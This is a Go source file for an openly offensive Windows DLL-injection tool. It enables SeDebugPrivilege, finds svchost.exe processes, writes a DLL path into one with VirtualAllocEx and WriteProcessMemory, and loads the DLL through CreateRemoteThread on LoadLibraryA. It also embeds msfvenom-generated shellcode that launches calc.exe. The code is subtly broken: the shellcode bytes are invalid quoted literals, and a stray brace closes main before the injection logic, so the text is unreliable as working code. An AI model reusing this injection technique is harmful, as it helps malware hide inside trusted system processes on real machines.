package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func setSeDebugPrivilege() {
	// Get current process (the one I wanna change)
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current process token
	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
	fmt.Printf("Length is %d\n", tokPrivLen)
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, tokPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Debug Priviledge granted")
}

func main() {
	var (
		target    = "svchost.exe"
		targetDLL = "cmddll.dll" // Place the DLL somewhere in the DLL search path of your Windows machine
		targetIDs []uint32
	)

	// msfvenom -p windows/exec CMD=calc.exe
	targetShellcode := [193]byte{'0xfc', '0xe8', '0x82', '0x00', '0x00', '0x00', '0x60', 
	'0x89', '0xe5', '0x31', '0xc0', '0x64', '0x8b', '0x50', '0x30', '0x8b', '0x52', '0x0c', 
	'0x8b', '0x52', '0x14', '0x8b', '0x72', '0x28', '0x0f', '0xb7', '0x4a', '0x26', '0x31', 
	'0xff', '0xac', '0x3c', '0x61', '0x7c', '0x02', '0x2c', '0x20', '0xc1', '0xcf', '0x0d', 
	'0x01', '0xc7', '0xe2', '0xf2', '0x52', '0x57', '0x8b', '0x52', '0x10', '0x8b', '0x4a', 
	'0x3c', '0x8b', '0x4c', '0x11', '0x78', '0xe3', '0x48', '0x01', '0xd1', '0x51', '0x8b', 
	'0x59', '0x20', '0x01', '0xd3', '0x8b', '0x49', '0x18', '0xe3', '0x3a', '0x49', '0x8b', 
	'0x34', '0x8b', '0x01', '0xd6', '0x31', '0xff', '0xac', '0xc1', '0xcf', '0x0d', '0x01', 
	'0xc7', '0x38', '0xe0', '0x75', '0xf6', '0x03', '0x7d', '0xf8', '0x3b', '0x7d', '0x24', 
	'0x75', '0xe4', '0x58', '0x8b', '0x58', '0x24', '0x01', '0xd3', '0x66', '0x8b', '0x0c', 
	'0x4b', '0x8b', '0x58', '0x1c', '0x01', '0xd3', '0x8b', '0x04', '0x8b', '0x01', '0xd0', 
	'0x89', '0x44', '0x24', '0x24', '0x5b', '0x5b', '0x61', '0x59', '0x5a', '0x51', '0xff', 
	'0xe0', '0x5f', '0x5f', '0x5a', '0x8b', '0x12', '0xeb', '0x8d', '0x5d', '0x6a', '0x01', 
	'0x8d', '0x85', '0xb2', '0x00', '0x00', '0x00', '0x50', '0x68', '0x31', '0x8b', '0x6f', 
	'0x87', '0xff', '0xd5', '0xbb', '0xf0', '0xb5', '0xa2', '0x56', '0x68', '0xa6', '0x95', 
	'0xbd', '0x9d', '0xff', '0xd5', '0x3c', '0x06', '0x7c', '0x0a', '0x80', '0xfb', '0xe0', 
	'0x75', '0x05', '0xbb', '0x47', '0x13', '0x72', '0x6f', '0x6a', '0x00', '0x53', '0xff', 
	'0xd5', '0x63', '0x61', '0x6c', '0x63', '0x2e', '0x65', '0x78', '0x65', '0x00'}
}

	// Grant the process SeDebugPrivilege
	setSeDebugPrivilege()

	// Check to find the process id (PID) we are interested in
	processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(processesSnap)
	if err != nil {
		log.Fatal(err)
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = windows.Process32First(processesSnap, &pe32)
	if err != nil {
		log.Fatal(err)
	}
	for {
		if pe32.ProcessID > 0 {
			processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
			if processName == target {
				targetIDs = append(targetIDs, pe32.ProcessID)
			}
		}
		err = windows.Process32Next(processesSnap, &pe32)
		if err != nil {
			break
		}
	}

	for _, targetID := range targetIDs {
		// Now that we have the PID of the process we want to target, we can get a handle to it
		// Since some SYSTEM processes seem not to be injectable, I iterate over all the results I find
		// until I find an injectable process
		victimProcess, err := windows.OpenProcess(
			windows.PROCESS_CREATE_THREAD|
				windows.PROCESS_VM_WRITE|
				windows.PROCESS_VM_READ|
				windows.PROCESS_VM_OPERATION,
			false, targetID)

		defer windows.CloseHandle(victimProcess)
		if err == nil {
			fmt.Printf("[+] Opened victim process %d\n", targetID)

			// Trying to allocate memory on remote process. VirtualAllocEx is not defined on the windows package
			var (
				kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
				virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
				writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
			)
			dwSize := uint32(len(targetDLL))
			addr, _, err := virtualAllocEx.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				uintptr(dwSize),
				uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
				uintptr(windows.PAGE_EXECUTE_READWRITE))
			if addr == 0 {
				fmt.Println("[-] virtualAllocEx returned NULL")
				log.Fatal(err)
			}

			// Trying to write the DLL path to the allocated memory
			buffer := []byte(targetDLL)
			var writtenBytes uint64 = 0
			r1, _, err := writeProcessMemory.Call(
				uintptr(victimProcess),
				uintptr(addr),
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(dwSize),
				uintptr(unsafe.Pointer(&writtenBytes)),
			)
			if r1 == 0 {
				fmt.Println("[-] writeProcessMemory failed")
				//log.Fatal(err)
			}
			fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)

			// Get LoadLibrary memory address
			moduleName, err := windows.UTF16FromString("kernel32.dll")
			if err != nil {
				log.Fatal(err)
			}
			var kernel32Module windows.Handle
			err = windows.GetModuleHandleEx(0, &moduleName[0], &kernel32Module)
			if err != nil {
				log.Fatal(err)
			}
			loadLibrary, err := windows.GetProcAddress(kernel32Module, "LoadLibraryA")
			if err != nil {
				log.Fatal(err)
			}

			// Create remote thread and launch out payload DLLs. CreateRemoteThread is not defined by the windows package
			createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
			r1, _, err = createRemoteThread.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				0,
				loadLibrary,
				addr,
				0,
				uintptr(unsafe.Pointer(nil)))
			if r1 == 0 {
				fmt.Println("[-] Failed to launch remote thread")
				log.Fatal(err)
			}
			handle := windows.Handle(r1)
			windows.WaitForSingleObject(handle, windows.INFINITE)
			break
		} else {
			fmt.Printf("[-] Failed to open victim process %d, trying another one\n", targetID)
		}
	}
}
